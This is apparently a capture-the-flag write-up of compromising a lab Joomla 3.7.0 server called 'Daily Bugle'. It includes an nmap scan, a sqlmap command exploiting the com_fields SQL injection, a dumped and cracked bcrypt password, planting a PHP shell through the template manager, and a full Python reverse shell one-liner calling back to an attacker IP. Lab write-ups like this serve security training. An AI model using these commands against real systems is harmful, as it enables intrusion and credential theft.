# The Daily Bugle

## recon

`nmap -p- -sV` revealed:

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-29 06:44 UTC
Nmap scan report for ip-10-10-213-186.eu-west-1.compute.internal (10.10.213.186)
Host is up (0.00076s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
3306/tcp open  mysql   MariaDB (unauthorized)
MAC Address: 02:13:6B:1F:86:78 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.84 seconds
```

So ssh, a web server and mysql/mariadb. A quick check showed that default creds don't work with the remote db, and/or random hosts are not allowed to read it.

The homepage of the webserver showed a Joomla site. Running joomscan against it (had to install it on kali) revealed the version as `3.7.0`.

## sqlmap

I did a quick search and found an exploit-db entry: https://www.exploit-db.com/exploits/42033

From this I ran the suggested sql map command to test it, and it worked. Given that the above exploit has the working tests for the blind sql injection, I specified one of those and quickly dumped the user table:

`
sqlmap -u "http://10.10.69.3/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --test-filter="MySQL >= 5.0 error-based - Parameter replace (FLOOR)" --random-agent --dump -p list[fullordering]
`

This gave me the hash for 'jonah': `$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm`. A standard bcrypt hash. Using hashcat on my windows machine (where my NVidia 2080 lives), I cracked this via `.\hashcat64.exe -m 3200 ..\hash.txt ..\rockyou.txt` (3200 for a bcrypt hash, as indicated by the `$2y`). The password was `spiderman123` :)

## a shell through joomla and escalation

The credentials didn't work for mysql or ssh, but they did log me into Joomla. Once in, I went to the template manager and used it to stick a php shell directly into the index page, placing it just below the heading. Nice.

With this I dropped my handy python reverse shell one liner (below), and got a shell as `apache` on the system:

Python one liner: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.105.239",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

